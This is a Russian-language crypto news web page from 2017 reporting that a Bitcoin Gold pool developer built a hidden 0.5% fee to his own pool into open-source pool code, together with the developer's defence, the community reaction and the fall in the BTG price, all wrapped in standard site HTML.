+<p>Сеть Bitcoin Gold (BTG) была запущена 13 ноября, и майнить криптовалюту теперь может любой желающий. При самом запуске проекта у майнингового пула Suprnova сразу возникла проблема с разделением цепей. Майнеры пишут, что Suprnova и другие BTG-пулы удалили скрытый протокол комиссии из своего ПО. Также, по слухам на форумах, создатель BTG Джек Ляо, предположительно, зарезервировал лично для себя премайн на 8000 блоков. Теперь некоторые подозревают, что это и побудило Куванджиева добавить код, который передаёт скрытые комиссии в его болгарский майнинговый пул.</p>
+<p>Кроме того, в репозитории команды BTG на Github появилось предупреждение «остерегаться скрытой комиссии».</p>
+<p>Однако сам Куванджиев объясняет, что никогда не скрывал исходный код своего пула, указывая, что код других пулов закрыт. «Что лучше?», &#8212; спрашивает Куванджиев, &#8212; «Единственный рабочий пул с закрытым кодом, или опенсорсный пул, [код которого] может отредактировать под себя кто угодно, отчисляющий 0,5% разработчику, который его написал? &#8230; Для обычного майнера это всего $1 в месяц».</p>
+<p>Как только новость попала в социальные сети, форумы и чат команды разработчиков в Slack, сообщество среагировало негативно. Кроме того, курс BTG заметно упал: еще 14 ноября цена BTG составляла $250, однако, после появления новости упала до $150. Кроме того, майнинговый пул btgmine.org, предположительно управляемый Куванджиевым, в итоге вовсе прекратил свою деятельность.</p>
+<p>Главный разработчик под ником h4x3rotab сообщил обратившемуся к нему журналисту bitcoin.com, что он «хотел бы помочь с этим, но у него нет времени на подробный ответ».</p>
+<p>Источник: <a target="_blank" rel="nofollow" href="https://coinspot.io/technology/mining/razrabotchik-bitcoin-gold-vstroil-v-kod-pula-nachislenie-komissii-na-svoj-lichnyj-adres/">coinspot.io</a></p>
+<script type="text/javascript">(function(w,doc) {
+if (!w.__utlWdgt ) {
+    w.__utlWdgt = true;
+    var d = doc, s = d.createElement('script'), g = 'getElementsByTagName';
+    s.type = 'text/javascript'; s.charset='UTF-8'; s.async = true;
+    s.src = ('https:' == w.location.protocol ? 'https' : 'http')  + '://w.uptolike.com/widgets/v1/uptolike.js';
+    var h=d[g]('body')[0];
+    h.appendChild(s);
+}})(window,document);
+</script>
+<div style="text-align:center;" data-lang="ru" data-url="http://bitcois.be/mining/razrabotchik-bitcoin-gold-vstroil-v-kod-pyla-nachislenie-komissii-na-svoi-lichnyi-adres.html" data-background-alpha="0.0" data-buttons-color="#ffffff" data-counter-background-color="#ffffff" data-share-counter-size="12" data-top-button="true" data-share-counter-type="common" data-share-style="1" data-mode="share" data-like-text-enable="false" data-hover-effect="scale" data-mobile-view="true" data-icon-color="#ffffff" data-orientation="horizontal" data-text-color="#000000" data-share-shape="rectangle" data-sn-ids="fb.vk.tw.ok.gp." data-share-size="40" data-background-color="#ffffff" data-preview-mobile="false" data-mobile-sn-ids="fb.vk.tw.wh.ok.vb." data-pid="cmsbitcoisbe" data-counter-background-alpha="1.0" data-following-enable="false" data-exclude-show-more="false" data-selection-enable="true" class="uptolike-buttons" ></div>
+
+ <!-- A generated by theme --> 
+
+<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script><div class="td-g-rec td-g-rec-id-content_bottom td_uid_4_6aa563dbe175c_rand td_block_template_1">
+<script type="text/javascript">
+var td_screen_width = document.body.clientWidth;
+
+                    if ( td_screen_width >= 1024 ) {
+                        /* large monitors */
+                        document.write('<ins class="adsbygoogle" style="display:inline-block;width:468px;height:60px" data-ad-client="ca-pub-0447105148397010" data-ad-slot="5575592712"></ins>');
+                        (adsbygoogle = window.adsbygoogle || []).push({});
+                    }
+            
+                    if ( td_screen_width >= 768  && td_screen_width < 1024 ) {
+                        /* portrait tablets */
+                        document.write('<ins class="adsbygoogle" style="display:inline-block;width:468px;height:60px" data-ad-client="ca-pub-0447105148397010" data-ad-slot="5575592712"></ins>');
+                        (adsbygoogle = window.adsbygoogle || []).push({});
+                    }
+                
+                    if ( td_screen_width < 768 ) {
+                        /* Phones */
+                        document.write('<ins class="adsbygoogle" style="display:inline-block;width:300px;height:250px" data-ad-client="ca-pub-0447105148397010" data-ad-slot="5575592712"></ins>');
+                        (adsbygoogle = window.adsbygoogle || []).push({});
+                    }
+                </script>
+</div>
+
+ <!-- end A --> 
+
+        </div>
+
+
+        <footer>
+                        
+            <div class="td-post-source-tags td-pb-padding-side">
+                                            </div>
+
+                        <div class="td-block-row td-post-next-prev"><div class="td-block-span6 td-post-prev-post"><div class="td-post-next-prev-content"><span>Предыдущая статья</span><a href="http://bitcois.be/article/skolko-elektichestva-rashodyetsia-na-tranzakciu-bitkoin.html">Сколько электичества расходуется на транзакцию Биткойн?</a></div></div><div class="td-next-prev-separator"></div><div class="td-block-span6 td-post-next-post"><div class="td-post-next-prev-content"><span>Следующая статья</span><a href="http://bitcois.be/news/kriptovaluty-odna-iz-samyh-obsyjdaemyh-tem-v-twitter.html">Криптовалюты — одна из самых обсуждаемых тем в Twitter</a></div></div></div>            <div class="td-author-name vcard author" style="display: none"><span class="fn"><a href="http://bitcois.be/author/bitcois">admin</a></span></div>	        <span style="display: none;" itemprop="author" itemscope itemtype="https://schema.org/Person"><meta itemprop="name" content="admin"></span><meta itemprop="datePublished" content="2017-11-17T13:29:56+00:00"><meta itemprop="dateModified" content="2017-11-17T13:29:56+03:00"><meta itemscope itemprop="mainEntityOfPage" itemType="https://schema.org/WebPage" itemid="http://bitcois.be/mining/razrabotchik-bitcoin-gold-vstroil-v-kod-pyla-nachislenie-komissii-na-svoi-lichnyi-adres.html"/><span style="display: none;" itemprop="publisher" itemscope itemtype="https://schema.org/Organization"><span style="display: none;" itemprop="logo" itemscope itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="/wp-content/logo-btc.png"></span><meta itemprop="name" content="Биткоис"></span><meta itemprop="headline " content="Разработчик Bitcoin Gold встроил в код пула начисление комиссии на свой личный адрес"><span style="display: none;" itemprop="image" itemscope itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="http://bitcois.be/wp-content/uploads/2017/11/6c385fc0d892b7fa8256436a92363966.jpg"><meta itemprop="width" content="600"><meta itemprop="height" content="337"></span>        </footer>
+
+    </article> <!-- /.post -->
+
+    <script>var block_td_uid_5_6aa563dbe2bda = new tdBlock();
+block_td_uid_5_6aa563dbe2bda.id = "td_uid_5_6aa563dbe2bda";
+block_td_uid_5_6aa563dbe2bda.atts = '{"limit":3,"sort":"","post_ids":"","tag_slug":"","autors_id":"","installed_post_types":"","category_id":"","category_ids":"","custom_title":"","custom_url":"","show_child_cat":"","sub_cat_ajax":"","ajax_pagination":"next_prev","header_color":"","header_text_color":"","ajax_pagination_infinite_stop":"","td_column_number":3,"td_ajax_preloading":"","td_ajax_filter_type":"td_custom_related","td_ajax_filter_ids":"","td_filter_default_txt":"\u0412\u0441\u0435","color_preset":"","border_top":"","class":"td_uid_5_6aa563dbe2bda_rand","el_class":"","offset":"","css":"","tdc_css":"","tdc_css_class":"td_uid_5_6aa563dbe2bda_rand","tdc_css_class_style":"td_uid_5_6aa563dbe2bda_rand_style","live_filter":"cur_post_same_categories","live_filter_cur_post_id":2035,"live_filter_cur_post_author":"1","block_template_id":""}';
+block_td_uid_5_6aa563dbe2bda.td_column_number = "3";
+block_td_uid_5_6aa563dbe2bda.block_type = "td_block_related_posts";
+block_td_uid_5_6aa563dbe2bda.post_count = "3";
+block_td_uid_5_6aa563dbe2bda.found_posts = "120";
+block_td_uid_5_6aa563dbe2bda.header_color = "";
+block_td_uid_5_6aa563dbe2bda.ajax_pagination_infinite_stop = "";
+block_td_uid_5_6aa563dbe2bda.max_num_pages = "40";
+tdBlocksArray.push(block_td_uid_5_6aa563dbe2bda);
+</script><div class="td_block_wrap td_block_related_posts td_uid_5_6aa563dbe2bda_rand td_with_ajax_pagination td-pb-border-top td_block_template_1"  data-td-block-uid="td_uid_5_6aa563dbe2bda" ><h4 class="td-related-title"><a id="td_uid_6_6aa563dbe3fba" class="td-related-left td-cur-simple-item" data-td_filter_value="" data-td_block_id="td_uid_5_6aa563dbe2bda" href="#">СХОЖИЕ СТАТЬИ</a><a id="td_uid_7_6aa563dbe3fbf" class="td-related-right" data-td_filter_value="td_related_more_from_author" data-td_block_id="td_uid_5_6aa563dbe2bda" href="#">БОЛЬШЕ ОТ АВТОРА</a></h4><div id=td_uid_5_6aa563dbe2bda class="td_block_inner">
+
+	<div class="td-related-row">
+
+	<div class="td-related-span4">
+
+        <div class="td_module_related_posts td-animation-stack td_mod_related_posts">
+            <div class="td-module-image">
+                <div class="td-module-thumb"><a href="http://bitcois.be/mining/dual-majning-eth-zil-v-2021-godu.html" rel="bookmark" title="Dual майнинг ETH + Zil в 2021 году"><img width="238" height="178" class="entry-thumb" src="http://bitcois.be/wp-content/uploads/2021/02/dual-majning-2021-eth-zil-238x178.jpg" srcset="http://bitcois.be/wp-content/uploads/2021/02/dual-majning-2021-eth-zil-238x178.jpg 238w, http://bitcois.be/wp-content/uploads/2021/02/dual-majning-2021-eth-zil-80x60.jpg 80w, http://bitcois.be/wp-content/uploads/2021/02/dual-majning-2021-eth-zil-100x75.jpg 100w, http://bitcois.be/wp-content/uploads/2021/02/dual-majning-2021-eth-zil-180x135.jpg 180w" sizes="(max-width: 238px) 100vw, 238px" alt="" title="Dual майнинг ETH + Zil в 2021 году"/></a></div>                            </div>
+            <div class="item-details">
+                <h3 class="entry-title td-module-title"><a href="http://bitcois.be/mining/dual-majning-eth-zil-v-2021-godu.html" rel="bookmark" title="Dual майнинг ETH + Zil в 2021 году">Dual майнинг ETH + Zil в 2021 году</a></h3>            </div>
+        </div>
+        
+	</div> <!-- ./td-related-span4 -->
+
+	<div class="td-related-span4">
+
+        <div class="td_module_related_posts td-animation-stack td_mod_related_posts">
+            <div class="td-module-image">
+                <div class="td-module-thumb"><a href="http://bitcois.be/mining/chto-delat-s-oshibkoj-pool-set-wrong-data-majning-nanopool.html" rel="bookmark" title="Что делать с ошибкой Pool set wrong data &#8230; майнинг Nanopool"><img width="238" height="178" class="entry-thumb" src="http://bitcois.be/wp-content/uploads/2019/11/problemy-nanopool-238x178.jpg" srcset="http://bitcois.be/wp-content/uploads/2019/11/problemy-nanopool-238x178.jpg 238w, http://bitcois.be/wp-content/uploads/2019/11/problemy-nanopool-80x60.jpg 80w, http://bitcois.be/wp-content/uploads/2019/11/problemy-nanopool-100x75.jpg 100w, http://bitcois.be/wp-content/uploads/2019/11/problemy-nanopool-180x135.jpg 180w" sizes="(max-width: 238px) 100vw, 238px" alt="" title="Что делать с ошибкой Pool set wrong data &#8230; майнинг Nanopool"/></a></div>                            </div>
+            <div class="item-details">
+                <h3 class="entry-title td-module-title"><a href="http://bitcois.be/mining/chto-delat-s-oshibkoj-pool-set-wrong-data-majning-nanopool.html" rel="bookmark" title="Что делать с ошибкой Pool set wrong data &#8230; майнинг Nanopool">Что делать с ошибкой Pool set wrong data &#8230; майнинг Nanopool</a></h3>            </div>
+        </div>
+        
+	</div> <!-- ./td-related-span4 -->
+
+	<div class="td-related-span4">
+
+        <div class="td_module_related_posts td-animation-stack td_mod_related_posts">
+            <div class="td-module-image">
+                <div class="td-module-thumb"><a href="http://bitcois.be/mining/hakery-vnedrili-novyj-sposob-majnit-kriptovalyutu.html" rel="bookmark" title="Хакеры внедрили новый способ майнить криптовалюту"><img width="238" height="178" class="entry-thumb" src="http://bitcois.be/wp-content/uploads/2019/10/hakery-majnyat-kriptovaljutu-238x178.jpg" srcset="http://bitcois.be/wp-content/uploads/2019/10/hakery-majnyat-kriptovaljutu-238x178.jpg 238w, http://bitcois.be/wp-content/uploads/2019/10/hakery-majnyat-kriptovaljutu-80x60.jpg 80w, http://bitcois.be/wp-content/uploads/2019/10/hakery-majnyat-kriptovaljutu-100x75.jpg 100w, http://bitcois.be/wp-content/uploads/2019/10/hakery-majnyat-kriptovaljutu-180x135.jpg 180w" sizes="(max-width: 238px) 100vw, 238px" alt="" title="Хакеры внедрили новый способ майнить криптовалюту"/></a></div>                            </div>
+            <div class="item-details">
+                <h3 class="entry-title td-module-title"><a href="http://bitcois.be/mining/hakery-vnedrili-novyj-sposob-majnit-kriptovalyutu.html" rel="bookmark" title="Хакеры внедрили новый способ майнить криптовалюту">Хакеры внедрили новый способ майнить криптовалюту</a></h3>            </div>
+        </div>
+        
+	</div> <!-- ./td-related-span4 --></div><!--./row-fluid--></div><div class="td-next-prev-wrap"><a href="#" class="td-ajax-prev-page ajax-page-disabled" id="prev-page-td_uid_5_6aa563dbe2bda" data-td_block_id="td_uid_5_6aa563dbe2bda"><i class="td-icon-font td-icon-menu-left"></i></a><a href="#"  class="td-ajax-next-page" id="next-page-td_uid_5_6aa563dbe2bda" data-td_block_id="td_uid_5_6aa563dbe2bda"><i class="td-icon-font td-icon-menu-right"></i></a></div></div> <!-- ./block -->
+	<div class="comments" id="comments">
+        	<div id="respond" class="comment-respond">
+		<h3 id="reply-title" class="comment-reply-title">ОСТАВЬТЕ ОТВЕТ <small><a rel="nofollow" id="cancel-comment-reply-link" href="/mining/razrabotchik-bitcoin-gold-vstroil-v-kod-pyla-nachislenie-komissii-na-svoi-lichnyi-adres.html#respond" style="display:none;">Отменить ответ</a></small></h3><form action="http://bitcois.be/wp-comments-post.php" method="post" id="commentform" class="comment-form" novalidate><div class="clearfix"></div>
+				<div class="comment-form-input-wrap td-form-comment">
+					<textarea placeholder="Комментарий:" id="comment" name="comment" cols="45" rows="8" aria-required="true"></textarea>
+					<div class="td-warning-comment">Please enter your comment!</div>
+				</div>
+		        <div class="comment-form-input-wrap td-form-author">
+			            <input class="" id="author" name="author" placeholder="Имя:*" type="text" value="" size="30"  aria-required='true' />
+			            <div class="td-warning-author">Please enter your name here</div>
+			         </div>
+<div class="comment-form-input-wrap td-form-email">
+			            <input class="" id="email" name="email" placeholder="Электронная почта:*" type="text" value="" size="30"  aria-required='true' />
+			            <div class="td-warning-email-error">You have entered an incorrect email address!</div>
+			            <div class="td-warning-email">Please enter your email address here</div>
+			         </div>
+<div class="comment-form-input-wrap td-form-url">
+			            <input class="" id="url" name="url" placeholder="Веб-Сайт:" type="text" value="" size="30" />
+                     </div>
+<p class="comment-form-cookies-consent"><input id="wp-comment-cookies-consent" name="wp-comment-cookies-consent" type="checkbox" value="yes" /> <label for="wp-comment-cookies-consent">Сохранить моё имя, email и адрес сайта в этом браузере для последующих моих комментариев.</label></p>
+<p class="form-submit"><input name="submit" type="submit" id="submit" class="submit" value="Опубликовать Комментарий" /> <input type='hidden' name='comment_post_ID' value='2035' id='comment_post_ID' />
+<input type='hidden' name='comment_parent' id='comment_parent' value='0' />
+</p><p style="display: none !important;"><label>&#916;<textarea name="ak_hp_textarea" cols="45" rows="8" maxlength="100"></textarea></label><input type="hidden" id="ak_js_1" name="ak_js" value="134"/><script>document.getElementById( "ak_js_1" ).setAttribute( "value", ( new Date() ).getTime() );</script></p></form>	</div><!-- #respond -->
+	    </div> <!-- /.content -->
+                                </div>
+                            </div>
+                            <div class="td-pb-span4 td-main-sidebar" role="complementary">
+                                <div class="td-ss-main-sidebar">
+                                    <aside class="td_block_template_1 widget widget_text"><h4 class="block-title"><span>Рекомендуем биржу</span></h4>			<div class="textwidget"><p><a style="display: block!important;" href="https://accounts.binance.com/ru/register?ref=B5ZYFJ0T" target="_blank" rel="nofollow noopener"><br />
+<img style="display: block!important;" title="Binance - лучшая биржа, присоединяйтесь" src="http://bitcois.be/wp-content/uploads/2021/11/binance-partner-sidebar.jpg" alt="Binance - лучшая биржа" border="0" /><br />
+</a></p>
+<p><a style="display: block!important;" href="https://exmo.me/?ref=577083" target="_blank" rel="nofollow noopener"><br />
+<img style="display: block!important;" title="EXMO bitcon banner" src="https://exmo.com/static/img/affiliate/affiliate2_ru.png" alt="EXMO affiliate program" border="0" /><br />
+</a></p>
+</div>
+		</aside><div class="td_block_wrap td_block_8 td_block_widget td_uid_8_6aa563dbe6378_rand td-pb-border-top td_block_template_1"  data-td-block-uid="td_uid_8_6aa563dbe6378" ><script>var block_td_uid_8_6aa563dbe6378 = new tdBlock();
+block_td_uid_8_6aa563dbe6378.id = "td_uid_8_6aa563dbe6378";
+block_td_uid_8_6aa563dbe6378.atts = '{"limit":"5","sort":"","post_ids":"","tag_slug":"","autors_id":"","installed_post_types":"","category_id":"","category_ids":"","custom_title":"\u041d\u0435\u0434\u0430\u0432\u043d\u0435\u0435","custom_url":"","show_child_cat":"","sub_cat_ajax":"","ajax_pagination":"","header_color":"#","header_text_color":"#","ajax_pagination_infinite_stop":"","td_column_number":1,"td_ajax_preloading":"","td_ajax_filter_type":"","td_ajax_filter_ids":"","td_filter_default_txt":"All","color_preset":"","border_top":"","class":"td_block_widget td_uid_8_6aa563dbe6378_rand","el_class":"","offset":"","css":"","tdc_css":"","tdc_css_class":"td_uid_8_6aa563dbe6378_rand","tdc_css_class_style":"td_uid_8_6aa563dbe6378_rand_style","live_filter":"","live_filter_cur_post_id":"","live_filter_cur_post_author":"","block_template_id":""}';
+block_td_uid_8_6aa563dbe6378.td_column_number = "1";
+block_td_uid_8_6aa563dbe6378.block_type = "td_block_8";
+block_td_uid_8_6aa563dbe6378.post_count = "5";
+block_td_uid_8_6aa563dbe6378.found_posts = "2339";
+block_td_uid_8_6aa563dbe6378.header_color = "#";
+block_td_uid_8_6aa563dbe6378.ajax_pagination_infinite_stop = "";
+block_td_uid_8_6aa563dbe6378.max_num_pages = "468";
+tdBlocksArray.push(block_td_uid_8_6aa563dbe6378);
+</script><h4 class="block-title"><span class="td-pulldown-size">Недавнее</span></h4><div id=td_uid_8_6aa563dbe6378 class="td_block_inner">
+
+	<div class="td-block-span12">
+
+        <div class="td_module_7 td_module_wrap td-animation-stack">
+        <div class="td-module-thumb"><a href="http://bitcois.be/news/kriptoindustriya-uverenno-vnedryaetsya-v-povsednevnuyu-zhizn.html" rel="bookmark" title="Криптоиндустрия уверенно внедряется в повседневную жизнь"><img width="100" height="75" class="entry-thumb" src="http://bitcois.be/wp-content/uploads/2022/02/cryptocom-arena-100x75.jpg" srcset="http://bitcois.be/wp-content/uploads/2022/02/cryptocom-arena-100x75.jpg 100w, http://bitcois.be/wp-content/uploads/2022/02/cryptocom-arena-80x60.jpg 80w, http://bitcois.be/wp-content/uploads/2022/02/cryptocom-arena-180x135.jpg 180w, http://bitcois.be/wp-content/uploads/2022/02/cryptocom-arena-238x178.jpg 238w, http://bitcois.be/wp-content/uploads/2022/02/cryptocom-arena-765x580.jpg 765w" sizes="(max-width: 100px) 100vw, 100px" alt="Криптоиндустрия уверенно внедряется в повседневную жизнь" title="Криптоиндустрия уверенно внедряется в повседневную жизнь"/></a></div>
+        <div class="item-details">
+            <h3 class="entry-title td-module-title"><a href="http://bitcois.be/news/kriptoindustriya-uverenno-vnedryaetsya-v-povsednevnuyu-zhizn.html" rel="bookmark" title="Криптоиндустрия уверенно внедряется в повседневную жизнь">Криптоиндустрия уверенно внедряется в повседневную жизнь</a></h3>
+            <div class="meta-info">
+                                                <span class="td-post-date"><time class="entry-date updated td-module-date" datetime="2022-02-08T17:21:37+00:00" >08.02.2022</time></span>                            </div>
+
+        </div>
+
+        </div>
+
+        
+	</div> <!-- ./td-block-span12 -->
+
+	<div class="td-block-span12">
+
+        <div class="td_module_7 td_module_wrap td-animation-stack">
+        <div class="td-module-thumb"><a href="http://bitcois.be/news/vrachi-ispolzuyut-blokchejn-tehnologiyu-dlya-hraneniya-meditsinskih-zapisej.html" rel="bookmark" title="Врачи используют блокчейн технологию для хранения медицинских записей"><img width="100" height="75" class="entry-thumb" src="http://bitcois.be/wp-content/uploads/2021/11/blockchejn-dlja-mediciny-100x75.jpg" srcset="http://bitcois.be/wp-content/uploads/2021/11/blockchejn-dlja-mediciny-100x75.jpg 100w, http://bitcois.be/wp-content/uploads/2021/11/blockchejn-dlja-mediciny-80x60.jpg 80w, http://bitcois.be/wp-content/uploads/2021/11/blockchejn-dlja-mediciny-180x135.jpg 180w, http://bitcois.be/wp-content/uploads/2021/11/blockchejn-dlja-mediciny-238x178.jpg 238w" sizes="(max-width: 100px) 100vw, 100px" alt="Врачи без ограничений используют технологию блокчейн" title="Врачи используют блокчейн технологию для хранения медицинских записей"/></a></div>
+        <div class="item-details">
+            <h3 class="entry-title td-module-title"><a href="http://bitcois.be/news/vrachi-ispolzuyut-blokchejn-tehnologiyu-dlya-hraneniya-meditsinskih-zapisej.html" rel="bookmark" title="Врачи используют блокчейн технологию для хранения медицинских записей">Врачи используют блокчейн технологию для хранения медицинских записей</a></h3>
+            <div class="meta-info">
+                                                <span class="td-post-date"><time class="entry-date updated td-module-date" datetime="2021-11-18T16:16:57+00:00" >18.11.2021</time></span>                            </div>
+
+        </div>
+
+        </div>
+
+        
+	</div> <!-- ./td-block-span12 -->
+
+	<div class="td-block-span12">
+
+        <div class="td_module_7 td_module_wrap td-animation-stack">
+        <div class="td-module-thumb"><a href="http://bitcois.be/news/mastercard-zapuskaet-kriptovalyutnye-platezhnye-karty.html" rel="bookmark" title="Mastercard запускает криптовалютные платежные карты в Азиатско-Тихоокеанском регионе"><img width="100" height="75" class="entry-thumb" src="http://bitcois.be/wp-content/uploads/2021/11/mastercard-kriptokarty-100x75.jpg" srcset="http://bitcois.be/wp-content/uploads/2021/11/mastercard-kriptokarty-100x75.jpg 100w, http://bitcois.be/wp-content/uploads/2021/11/mastercard-kriptokarty-80x60.jpg 80w, http://bitcois.be/wp-content/uploads/2021/11/mastercard-kriptokarty-180x135.jpg 180w, http://bitcois.be/wp-content/uploads/2021/11/mastercard-kriptokarty-238x178.jpg 238w" sizes="(max-width: 100px) 100vw, 100px" alt="Mastercard запускает криптовалютные платежные карты" title="Mastercard запускает криптовалютные платежные карты в Азиатско-Тихоокеанском регионе"/></a></div>
+        <div class="item-details">
+            <h3 class="entry-title td-module-title"><a href="http://bitcois.be/news/mastercard-zapuskaet-kriptovalyutnye-platezhnye-karty.html" rel="bookmark" title="Mastercard запускает криптовалютные платежные карты в Азиатско-Тихоокеанском регионе">Mastercard запускает криптовалютные платежные карты в Азиатско-Тихоокеанском регионе</a></h3>
+            <div class="meta-info">
+                                                <span class="td-post-date"><time class="entry-date updated td-module-date" datetime="2021-11-18T14:15:28+00:00" >18.11.2021</time></span>                            </div>
+
+        </div>
+
+        </div>
+
+        
+	</div> <!-- ./td-block-span12 -->
+
+	<div class="td-block-span12">
+
+        <div class="td_module_7 td_module_wrap td-animation-stack">
+        <div class="td-module-thumb"><a href="http://bitcois.be/news/ozhidayut-vosstanovlenie-eth.html" rel="bookmark" title="Быки ETH ожидают восстановление ключевого уровня &#8212; ралли на $ 5 тыс."><img width="100" height="75" class="entry-thumb" src="http://bitcois.be/wp-content/uploads/2021/11/ozhidaem-eth-5000-100x75.jpg" srcset="http://bitcois.be/wp-content/uploads/2021/11/ozhidaem-eth-5000-100x75.jpg 100w, http://bitcois.be/wp-content/uploads/2021/11/ozhidaem-eth-5000-80x60.jpg 80w, http://bitcois.be/wp-content/uploads/2021/11/ozhidaem-eth-5000-180x135.jpg 180w, http://bitcois.be/wp-content/uploads/2021/11/ozhidaem-eth-5000-238x178.jpg 238w" sizes="(max-width: 100px) 100vw, 100px" alt="Ожидаем ETH на 5000" title="Быки ETH ожидают восстановление ключевого уровня &#8212; ралли на $ 5 тыс."/></a></div>
+        <div class="item-details">
+            <h3 class="entry-title td-module-title"><a href="http://bitcois.be/news/ozhidayut-vosstanovlenie-eth.html" rel="bookmark" title="Быки ETH ожидают восстановление ключевого уровня &#8212; ралли на $ 5 тыс.">Быки ETH ожидают восстановление ключевого уровня &#8212; ралли на $ 5...</a></h3>
+            <div class="meta-info">
+                                                <span class="td-post-date"><time class="entry-date updated td-module-date" datetime="2021-11-18T14:07:33+00:00" >18.11.2021</time></span>                            </div>
+
+        </div>
+
+        </div>
+
+        
+	</div> <!-- ./td-block-span12 -->
+
+	<div class="td-block-span12">
+
+        <div class="td_module_7 td_module_wrap td-animation-stack">
+        <div class="td-module-thumb"><a href="http://bitcois.be/news/obnovlenie-bitcoin-taproot-spotovyj-etf.html" rel="bookmark" title="Обновление Bitcoin Taproot запускается, первый спотовый ETF отклонен"><img width="100" height="75" class="entry-thumb" src="http://bitcois.be/wp-content/uploads/2021/11/bitcoin-taproot-100x75.jpg" srcset="http://bitcois.be/wp-content/uploads/2021/11/bitcoin-taproot-100x75.jpg 100w, http://bitcois.be/wp-content/uploads/2021/11/bitcoin-taproot-80x60.jpg 80w, http://bitcois.be/wp-content/uploads/2021/11/bitcoin-taproot-180x135.jpg 180w, http://bitcois.be/wp-content/uploads/2021/11/bitcoin-taproot-238x178.jpg 238w" sizes="(max-width: 100px) 100vw, 100px" alt="Обновление Bitcoin Taproot" title="Обновление Bitcoin Taproot запускается, первый спотовый ETF отклонен"/></a></div>
+        <div class="item-details">
+            <h3 class="entry-title td-module-title"><a href="http://bitcois.be/news/obnovlenie-bitcoin-taproot-spotovyj-etf.html" rel="bookmark" title="Обновление Bitcoin Taproot запускается, первый спотовый ETF отклонен">Обновление Bitcoin Taproot запускается, первый спотовый ETF отклонен</a></h3>
+            <div class="meta-info">
+                                                <span class="td-post-date"><time class="entry-date updated td-module-date" datetime="2021-11-18T13:59:03+00:00" >18.11.2021</time></span>                            </div>
+
+        </div>
+
+        </div>
+
+        
+	</div> <!-- ./td-block-span12 --></div></div> <!-- ./block --><aside class="td_block_template_1 widget widget_calendar"><h4 class="block-title"><span>Календарь</span></h4><div id="calendar_wrap" class="calendar_wrap"><table id="wp-calendar" class="wp-calendar-table">
+	<caption>Сентябрь 2026</caption>
+	<thead>
+	<tr>
+		<th scope="col" title="Понедельник">Пн</th>
+		<th scope="col" title="Вторник">Вт</th>
+		<th scope="col" title="Среда">Ср</th>
+		<th scope="col" title="Четверг">Чт</th>
+		<th scope="col" title="Пятница">Пт</th>
+		<th scope="col" title="Суббота">Сб</th>
+		<th scope="col" title="Воскресенье">Вс</th>
+	</tr>
+	</thead>
+	<tbody>
+	<tr>
+		<td colspan="1" class="pad">&nbsp;</td><td>1</td><td>2</td><td>3</td><td>4</td><td>5</td><td>6</td>
+	</tr>
+	<tr>
+		<td>7</td><td>8</td><td>9</td><td>10</td><td>11</td><td id="today">12</td><td>13</td>
+	</tr>
+	<tr>
+		<td>14</td><td>15</td><td>16</td><td>17</td><td>18</td><td>19</td><td>20</td>
+	</tr>
+	<tr>
+		<td>21</td><td>22</td><td>23</td><td>24</td><td>25</td><td>26</td><td>27</td>
+	</tr>
+	<tr>
+		<td>28</td><td>29</td><td>30</td>
+		<td class="pad" colspan="4">&nbsp;</td>
+	</tr>
+	</tbody>
+	</table><nav aria-label="Предыдущий и следующий месяцы" class="wp-calendar-nav">
+		<span class="wp-calendar-nav-prev"><a href="http://bitcois.be/2022/02">&laquo; Фев</a></span>
+		<span class="pad">&nbsp;</span>
+		<span class="wp-calendar-nav-next">&nbsp;</span>
+	</nav></div></aside>                                </div>
+                            </div>
+                                    </div> <!-- /.td-pb-row -->
+        </div>
+    </div> <!-- /.td-container -->
+
+    <!-- Instagram -->
+    
+
+    <!-- Footer -->
+    <div class="td-footer-container td-container">
+
+	<div class="td-pb-row">
+		<div class="td-pb-span12">
+			
+ <!-- A generated by theme --> 
+
+<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script><div class="td-g-rec td-g-rec-id-footer_top td_uid_9_6aa563dbeb483_rand td_block_template_1">
+<script type="text/javascript">
+var td_screen_width = document.body.clientWidth;
+
+                    if ( td_screen_width >= 1024 ) {
+                        /* large monitors */
+                        document.write('<ins class="adsbygoogle" style="display:inline-block;width:728px;height:90px" data-ad-client="ca-pub-0447105148397010" data-ad-slot="3987178877"></ins>');
+                        (adsbygoogle = window.adsbygoogle || []).push({});
+                    }
+            
+                    if ( td_screen_width >= 768  && td_screen_width < 1024 ) {
+                        /* portrait tablets */
+                        document.write('<ins class="adsbygoogle" style="display:inline-block;width:468px;height:60px" data-ad-client="ca-pub-0447105148397010" data-ad-slot="3987178877"></ins>');
+                        (adsbygoogle = window.adsbygoogle || []).push({});
+                    }
+                
+                    if ( td_screen_width < 768 ) {
+                        /* Phones */
+                        document.write('<ins class="adsbygoogle" style="display:inline-block;width:320px;height:50px" data-ad-client="ca-pub-0447105148397010" data-ad-slot="3987178877"></ins>');
+                        (adsbygoogle = window.adsbygoogle || []).push({});
+                    }
+                </script>
+</div>
+
+ <!-- end A --> 
+
+		</div>
+	</div>
+
+	<div class="td-pb-row">
+		<div class="td-pb-span4">
+			<div class="td_block_wrap td_block_text_with_title td_block_widget td_uid_10_6aa563dbeb7cf_rand td-pb-border-top td_block_template_1"  data-td-block-uid="td_uid_10_6aa563dbeb7cf" ><h4 class="block-title"><span class="td-pulldown-size">О сайте</span></h4><div class="td_mod_wrap td-pb-padding-side">Все материалы на данном сайте взяты из открытых источников и предоставляются исключительно в ознакомительных целях. Права на материалы принадлежат их владельцам. Администрация сайта ответственности за содержание материала не несет.</div></div>		</div>
+
+		<div class="td-pb-span4">
+			<aside class="td_block_template_1 widget widget_nav_menu"><h4 class="block-title"><span>Рубрики</span></h4><div class="menu-menu-3-container"><ul id="menu-menu-4" class="menu"><li id="menu-item-182" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-first td-menu-item td-normal-menu menu-item-182"><a href="http://bitcois.be/news">Новости</a></li>
+<li id="menu-item-183" class="menu-item menu-item-type-taxonomy menu-item-object-category td-menu-item td-normal-menu menu-item-183"><a href="http://bitcois.be/article">Статьи</a></li>
+<li id="menu-item-184" class="menu-item menu-item-type-taxonomy menu-item-object-category td-menu-item td-normal-menu menu-item-184"><a href="http://bitcois.be/exchange">Биржи</a></li>
